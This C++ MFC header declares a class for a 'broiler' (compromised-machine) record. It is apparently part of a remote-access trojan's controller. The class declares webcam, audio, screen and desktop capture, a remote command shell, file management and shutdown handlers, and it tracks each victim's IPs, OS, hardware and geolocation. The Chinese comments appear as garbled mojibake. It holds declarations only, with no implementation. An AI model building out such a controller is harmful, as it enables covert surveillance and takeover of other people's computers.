#pragma once

#include "ModuleSocket.h"
#include "Common.h"
#include "FileManager.h"
#include "QQwry.h"
#include "CmdShell.h"
#include "SystemManager.h"
#include "ChatDlg.h"
#include "ScreenDlg.h"
#include "VideoDlg.h"
#include "AudioDlg.h"
#include "RemoteCmdDlg.h"
#include "DesktopDlg.h"

//�⼦�� ������Ϣ
class CBroilerData : public CDialog
{
public:
	CBroilerData(UINT id, SOCKET socket, sockaddr_in* serAddr, HWND hWnd);
	~CBroilerData(void);

public:
	void OpenWorkThread();   //���������߳�
	UINT32 ShackHandCheck(IN const char* pSingle, OUT bool* pbSuccess); //������֤
    void OnBeginListen();
	static DWORD WINAPI OnListenProc(LPVOID lpParameter);
	CString OSVersion(IN int sysVer);
	void RunToFileManager();  //�����ļ�����
	void RunToScreenManager();  //������Ļ����
	void RunToSystemManager();  //����ϵͳ����
	void RunToCMDShellManager();  //����CMDShell
	void RuntToVideoManager();   //��������ͷ
   
	SOCKET  m_socket;         //ͨ��socket��Ϣ(��Ϣ�Ĵ���)
	CFileManager* m_pFileDlg;       //�ļ������Ի�����
	CScreenDlg* m_pScreenDlg;       //��Ļ����Ի�����
	CSystemManager* m_pSystemDlg;   //ϵͳ����Ի�����
    CCmdShell* m_pCmdShellDlg;      //CMDShell�����Ի�����
	CVideoDlg* m_pVideoDlg;         //����ͷ
   
	CString CharToCString(char* result);
	CStringW CStrA2CStrW(const CStringA &cstrSrcA);  // CStringAתCStringW  Unicode������
	CStringA CStrW2CStrA(const CStringW &cstrSrcW);  // CStringWתCStringA

public:
	//�˵�Ŀ¼
	void RunToChatMsgManager();  //��ʹ����
    CChatDlg* m_pChatDlg;   //����Ի�����
	void RunToOperatorManager(IN const int nType);   //�ػ�/ע��/����

	CAudioDlg* m_pAudioDlg;  //����������
	void RunToAudioManager();  //������������

	CRemoteCmdDlg* m_pRemoteCmdDlg;  //Զ������㲥
	void RunToRemoteCmdManager(); //Զ������

	CDesktopDlg* m_pDesktopDlg;  //�������
	void RunToDesktopManager();   //�������

//data operation
public:
	UINT getID() const {return m_nId; }
	void SetID(const UINT nId) {m_nId = nId; }

	CString getWANIP() const {return m_strWANIP; }
	void SetWANIP(const CString strWANIP) {m_strWANIP = strWANIP; }

	CString getLocalIP() const {return m_strLocalIP; }
	void SetLocalIP(const CString strLocalIP) {m_strLocalIP = strLocalIP; }
	
	CString getRemark() const {return m_strRemark; }
	void SetRemark(const CString strRemark) {m_strRemark = strRemark; }

	CString getOSVersion() const {return m_strOSVersion; }
	void SetOSVersion(const CString strOSVersion) {m_strOSVersion = strOSVersion; }

	CString getCPU() const {return m_strCPU; }
	void SetCPU(const CString strCPU) {m_strCPU = strCPU; }

	bool bCap() const {return m_bCam; }
	void SetCam(const bool bCam) {m_bCam = bCam; }

	CString getDiskSize() const {return m_strDiskSize;}
	void SetDiskSize(const CString strDiskSize) {m_strDiskSize = strDiskSize; }

	CString getAddress() const {return m_strAddress; }
	void SetAddress(const CString strAddress) {m_strAddress = strAddress; }
private:
	HWND    m_hWnd;
	CModuleSocket m_ModuleSocket;
	CQQwry m_QQwry;   //��ѯIP��ַ����λ��

	UINT    m_nId;            //ID���
	CString m_strWANIP;       //����ip��ַ
	CString m_strLocalIP;     //����ip��ַ
	CString m_strRemark;      //�������/��ע
	CString m_strOSVersion;   //����ϵͳ�İ汾
	CString m_strCPU;         //CPU��Ϣ
	bool    m_bCam;           //����ͷ
	CString m_strDiskSize;    //Ӳ�̴�С
	CString m_strAddress;     //�����ַ
};
